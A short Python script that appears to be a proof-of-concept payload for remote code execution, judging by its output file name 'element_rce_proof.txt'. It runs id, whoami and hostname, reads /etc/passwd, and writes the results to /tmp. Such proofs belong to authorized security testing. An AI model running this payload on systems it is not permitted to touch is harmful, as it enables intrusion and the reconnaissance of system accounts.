#!/usr/bin/env python3
import os
result = os.popen("id").read()
with open("/tmp/element_rce_proof.txt", "w") as f:
    f.write(result)
    f.write(os.popen("whoami").read())
    f.write(os.popen("hostname").read())
    f.write(os.popen("cat /etc/passwd").read())
